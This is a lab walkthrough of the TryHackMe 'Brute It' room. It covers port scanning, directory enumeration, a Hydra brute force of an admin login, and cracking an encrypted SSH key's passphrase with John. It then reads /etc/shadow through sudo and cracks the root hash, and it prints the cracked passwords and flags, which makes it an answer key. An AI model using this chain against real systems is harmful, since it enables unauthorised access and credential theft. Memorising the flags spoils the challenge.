# TryHackMe Brute It Writeup

## ``Nmap``

```bash
nmap -sCV 10.10.135.215
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 23:16 EDT
Nmap scan report for 10.10.153.203
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.71 seconds
                                                                                                
```

## ``Gobuster``

```
gobuster dir -u http://10.10.153.203/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.153.203/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.10.153.203/admin/]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 278]
Progress: 4744 / 4745 (99.98%)
===============================================================
Finished
===============================================================
```

```
http://10.10.153.203/admin
```

![image](https://github.com/user-attachments/assets/e5a20a0e-3094-4557-8b14-caa3a90d0c3b)

![image](https://github.com/user-attachments/assets/8f3d153d-bd0d-4a6c-b7fd-457bc040c4e7)

## ``Hydra``

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.153.203 http-post-form "/admin:username=^USER^&password=^PASS^:Invalid"
```

passowrd

```
xavier
```

![image](https://github.com/user-attachments/assets/115d6bde-e617-4e15-843e-56e18aa16c91)

## ``crack rsa key``

make ``id_rsa`` file:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA

JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
+Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
-----END RSA PRIVATE KEY-----
```

```
ssh2john id_rsa > rsa_hash.txt
```

```
john rsa_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
john rsa_hash.txt --show
```

![image](https://github.com/user-attachments/assets/a26152ae-6aee-43d3-b4e6-287679b1e14a)

```
rockinroll
```

* <details>

    
    
    📌 ليه المفتاح الخاص عليه Passphrase؟
    عشان لو المفتاح الخاص اتسرب (مثلاً حد وصلك مفتاح id_rsa من السيرفر)، ما يقدرش يستخدمه على طول. بيكون عليه طبقة حماية إضافية:
    
       * المفتاح متشفر (encrypted private key)
        
       * والتشفير ده بيتم بحماية بكلمة سر (passphrase)
        
       * عشان كده لما تيجي تستخدمه بـ ssh بيطلب منك passphrase
    
    
    ## 📌 ايه اللي بنعمله ب John The Ripper؟
       - إحنا مش بنحاول نكسر المفتاح نفسه (لأن كسر RSA key صعب جدًا ومستحيل عمليًا في الوقت الحالي لو المفتاح حجمه كبير).
    
    إحنا بنعمل:
    ➡ نحاول نكسر الـ passphrase اللي بيحمي المفتاح.
    
    
    
    ---
    
    🔑 مثال عملي
    مفتاح بدون passphrase
    ```
    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQE...
    ```
    مفتاح عليه passphrase
    ```
    -----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: AES-128-CBC,3F2A1C3D4B5A6C7D8E9F0123456789AB
    MIIEpAIBAAKCAQE...
    ```
    أو
    
    ```
    -----BEGIN ENCRYPTED PRIVATE KEY-----
    MIIE6TAbBgkqhkiG9w0BBQMwDgQIYcbHcVg...
    ```
    
    
      
  </details>

## ``ssh``

```
chmod 600 id_rsa
```

```
ssh -i id_rsa john@10.10.153.203
```

![image](https://github.com/user-attachments/assets/d1d3d120-5613-4a68-817f-6c526faf0859)

user.txt

```
THM{a_password_is_not_a_barrier}
```

## ``priv esc``

```
sudo -l 
```

![image](https://github.com/user-attachments/assets/0554078a-8bc5-49da-96fd-c468a8b7077d)

![image](https://github.com/user-attachments/assets/ca048a2c-0c57-405d-89f6-85761dc8ab78)

```
sudo cat /etc/shadow
```

```
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```

```
echo 'root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::' > hashes.txt
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```
john --show hashes.txt
```

```

root:football:::::::

1 password hash cracked, 0 left
```

![image](https://github.com/user-attachments/assets/c947f52f-c0b2-4d9e-b9cb-9c4b9514e304)

root.txt

```
THM{pr1v1l3g3_3sc4l4t10n}
```

